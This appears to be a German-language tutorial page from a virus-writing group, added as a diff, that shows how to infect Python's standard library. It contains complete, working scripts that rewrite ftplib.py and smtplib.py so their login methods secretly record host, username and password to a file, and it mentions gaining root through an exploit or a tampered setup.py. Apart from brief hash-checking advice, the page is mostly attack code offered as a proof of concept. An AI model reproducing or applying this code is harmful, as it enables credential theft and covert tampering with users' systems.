@@ -1,0 +1,275 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta name="generator" content=
+"HTML Tidy for Windows (vers 14 February 2006), see www.w3.org" />
+<meta http-equiv="Content-Type" content=
+"text/html; charset=us-ascii" />
+<title>Python Core Injection</title>
+</head>
+<body>
+<hr />
+<pre>
+<b>[+]</b><u>Topic: Tutorial</u>
+<b>[+]</b><u>Von: dav1d</u>
+<b>[+]</b><u>Return: <a href=
+"javascript:history.back()">Tutorials</a></u>
+</pre>
+	<hr />
+<xmp>
+### Pynject ###
+===============
+
+__author__ = 'dav1d'
+__code_lang__ = 'python'
+__license__ = 'MIT'
+__os__ = ['nt', 'posix'] # os.name
+
+
+>1< __intro__
+>2< __prinzip__
+>3< __umsetzung__
+>4< __outro__
+
+
+>1< __intro___
+
+In diesem kleinen Paper, werde ich euch zeigen, wie man die Std.-Lib von Python mit
+Schadcode infiziert.
+
+Vorraussetzungen:
+* Python-Interpreter (recommended: 2.7)
+
+Ich werde in jeder Section etwas zu den Besonderheiten von Linux (posix) und Windows (nt).
+
+>2< __prinzip__
+
+Am einfachsten infiziert man die Std.-Lib von Python mit Pythoncode, den man in ein schon
+vorhandenes Modul "einbaut". In der "ftplib" aendert man z.B. du login Methode so ab. dass
+sie die Logindaten mit loggt.
+ __________________________________________________________
+|                                                          |
+| Man braucht je nach Installationsort und Rechten         |
+| bei Linux Root-Rechte um die Module veraendern zu koennen  |
+|__________________________________________________________|
+
+Es gibt 2 Moeglichkeiten dem Skript zu sagen, wo der Code eingeschleust werden soll:
+1. Zeilenangabe
+2. "Orientierung" an einem einamligen String im Modul z.B.: Docstring
+
+Auf was muss man achten?:
+* der Code sollte das Modul nicht beeintraechtigen
+* der Code muss ins Modul passen (Einrueckung, Klammern)
+* das Skript sollte nicht 2mal infiziert werden
+
+Wie kann man sich schuetzen?:
+* dem normalen "user" keine Rechte auf das Lib-Verzeichnis gewaehren (Linux)
+* regelmaeßig die Hashs der Datein pruefen (z.B. mit einem skript) (Linux / Win).
+   Tool: o md5sum (Linux)
+         o http://www.fastsum.com/ (Win)
+
+Beide Methoden sind sinnvoll, jedoch ist die erste praeventiv taetig.
+
+>3< __umsetzung__
+
+Wie oben schon erwaehnt braucht man unter Linux Root-Rechte, wenn's bloed geht, die kann
+man sich entweder mit z.B. nen Exploit "erarbeiten" oder eine setup.py von einem anderen
+Modul so modifizieren, dass der eigene Code auch ausgefuehrt wird (logischweise braucht man
+fuer die Installation eines Moduls auch die entsprechenden Rechte). Im weiteren Verlauf des
+Papers, werde ich auf diese Problematik _nicht_ weiter eingehen.
+
+Welche Module lohnen sich, dass man sie Infiziert?:
+* ftplib.py
+* smtplib.py
+* imaplib.py
+
+Ich verwende die ftplib um zu zeigen wie mein ein solches Modul infiziert und als schmakerl
+gibts auch noch den Code fuer die smtplib ;).
+
+Was brauchen wir?:
+* den Code der eingeschleust werden soll
+* eine Funktion die das macht
+* Informationen ueber das OS und das Modul
+
+
+Vorarbeit:
+
+In der ftplib (Python 2.7) befindet sich in Zeile 363 die Methode login, in der alle 
+Informationen, wie User, Passwort und Host. In zeile 364 ist ein einmaliger String, also
+haben wir die beide Moeglichkeiten um das Modul zu infizieren, jetzt brauchen wir noch den
+Code, der eingeschleust werden soll:
+
+---------------------------------------------------------------------------------------------------
+INJECTION = ['        x = open(\'C:\\\\inj.txt\', \'a\')\n',
+             '        x.write(\'Host: %s, User: %s, Pass: %s\\n\' % (self.host, user, passwd))\n',
+             '        x.close()\n',
+             '        del x\n']
+---------------------------------------------------------------------------------------------------
+
+Jeder String in der Liste representiert eine Zeile, die spaeter eingefuegt wird. Es wird eine Datei
+(C:\\inj.txt) geoeffnet und in dieser werden host, user und pass gespeichert. Jetzt zur Funktion:
+
+---------------------------------------------------------------------------------------------------
+def inject_ftplib(injection_code):
+    '''Inject the ftplib.py, with own code'''
+    temp = []
+    ftplib_dir = join(sys.prefix, 'lib')
+    if osname == 'posix': # Is there a better way?
+        ftplib_dir = join(ftplib_dir, 'python%s' % (sys.version[:3]))
+    with open(join(ftplib_dir, 'ftplib.py'), 'r') as f:
+        #for i, line in enumerate(f): # for the fast method
+        for line in f: # For the slow and safer method
+            temp.append(line)
+            if '\'\'\'Login, default anonymous.\'\'\'' in line: # Slow but safer
+            #if i == 363: # Fast
+                next_line = f.next()
+                if next_line.lstrip().startswith('#'):
+                    return 'Already injected'
+                temp.append('        # Don\'t change\n')
+                if isinstance(injection_code, list):
+                    temp.extend(injection_code)
+                else:
+                    temp.append(injection_code)
+                temp.append(next_line)
+    with open(join(ftplib_dir, 'ftplib.py'), 'wb') as f:
+        for line in temp:
+            f.write(line)
+    return 'Injection complete!'
+---------------------------------------------------------------------------------------------------
+
+Die Funktion nimmt entweder einen String oder eine Liste, welche den Code enthaelt, der eingefuegt
+werden soll (injection_code).
+Zu Beginn wird geprueft, ob es sich um Linux oder ein anderes System handelt (osname = os.name),
+wenn dem so ist, wird das Verzeichnis (ftplib_dir) angepasst. 
+Jetzt gehts ins Eingemachte, als erstes wird das Modul zum lesen geoeffnet und es wird nach dem 
+"Magic string" gesucht oder eben bis zur Zeile X (363) iteriert, bis dahin wurde schon jede Zeile
+des Moduls in temp gespeichert, wenn der Code nun entweder beim "Magic string" oder bei Zeile X
+angelangt ist, wird geprueft, ob die naechste Zeile mit eine '#' beginnt, wenn ja, wurde die Lib
+schon infiziert, falls nicht, wird der injection_code an temp angehaengt und es wird weiter ueber 
+das Modul iteriert, sodass sich am Ende eine Kopie des Moduls mit zusaetzlichem Code in temp befindet,
+im naechsten Schritt wird mit diesem Code das echte Modul ueberschrieben.
+
+Der komplette Code:
+
+----------------------------------------------------------------------------------------------------
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+from __future__ import with_statement
+from os import name as osname
+from os.path import join
+import sys
+
+INJECTION = ['        x = open(\'C:\\\\test.txt\', \'a\')\n',
+             '        x.write(\'Host: %s, User: %s, Pass: %s\\n\' % (self.host, user, passwd))\n',
+             '        x.close()\n',
+             '        del x\n']
+
+def inject_ftplib(injection_code):
+    '''Inject the ftplib.py, with own code'''
+    temp = []
+    ftplib_dir = join(sys.prefix, 'lib')
+    if osname == 'posix': # Is there a better way?
+        ftplib_dir = join(ftplib_dir, 'python%s' % (sys.version[:3]))
+    with open(join(ftplib_dir, 'ftplib.py'), 'r') as f:
+        #for i, line in enumerate(f): # for the fast method
+        for line in f: # For the slow and safer method
+            temp.append(line)
+            if '\'\'\'Login, default anonymous.\'\'\'' in line: # Slow but safer
+            #if i == 363: # Fast
+                next_line = f.next()
+                if next_line.lstrip().startswith('#'):
+                    return 'Already injected'
+                temp.append('        # Don\'t change\n')
+                if isinstance(injection_code, list):
+                    temp.extend(injection_code)
+                else:
+                    temp.append(injection_code)
+                temp.append(next_line)
+    with open(join(ftplib_dir, 'ftplib.py'), 'wb') as f:
+        for line in temp:
+            f.write(line)
+    return 'Injection complete!'
+
+if __name__ == '__main__':
+    from time import clock
+    start = clock()
+    ret = inject_ftplib(INJECTION)
+    print ret
+    print 'Time:', clock() - start
+----------------------------------------------------------------------------------------------------
+
+Das wars!
+
+md5sum Vergleich:
+Vorher : 4bf872281c32f99b8695eaff8f0841c8  ftplib.py
+Nachher: 4a5b00afd73be32037697d2c033f5e1e  ftplib.py
+
+Und wie versprochen der Code fuer die smtplib:
+
+----------------------------------------------------------------------------------------------------
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+from __future__ import with_statement
+from os import name as osname
+from os.path import join
+import sys
+
+INJECTION = ['        x = open(\'C:\\\\inj.txt\', \'a\')\n',
+             '        x.write(\'Host: %s, Port: %s, User: %s, Pass: %s\\n\'',
+             ' % (self.host, self.port, user, password))\n',
+             '        x.close()\n',
+             '        del x\n']
+
+def inject_smtplib(injection_code):
+    '''Inject the smtplib.py, with own code'''
+    temp = []
+    smtplib_dir = join(sys.prefix, 'lib')
+    if osname == 'posix': # Is there a better way?
+        smtplib_dir = join(smtplib_dir, 'python%s' % (sys.version[:3]))
+    with open(join(smtplib_dir, 'smtplib.py'), 'r') as f:
+        for i, line in enumerate(f):
+            temp.append(line)
+            if i == 296:
+                next_line = f.next()
+                if next_line.strip() == 'self.host = host':
+                    return 'Already injected'
+                temp.append('        self.host = host\n        self.port = port\n')
+                temp.append(next_line)
+            elif i == 536:
+                next_line = f.next()
+                if isinstance(injection_code, list):
+                    temp.extend(injection_code)
+                else:
+                    temp.append(injection_code)
+                temp.append(next_line)
+    with open(join(smtplib_dir, 'smtplib.py'), 'wb') as f:
+        f.writelines(temp)
+    return 'Injection complete!'
+
+if __name__ == '__main__':
+    from time import clock
+    start = clock()
+    ret = inject_smtplib(INJECTION)
+    print ret
+    print 'Time:', clock() - start
+----------------------------------------------------------------------------------------------------
+
+>4< __outro__
+
+Das wars auch schon wieder, ich hoffe das hat euch was gebracht....
+Und nicht vergessen, das ist nur ein POC ;).
+
+
+============================================
+### written /\ for: vxnet /\ from: dav1d ###
+
+
+~> PS: The more they change, the more they stay the same <~
+
+</xmp>
+
+</body>
+</html>
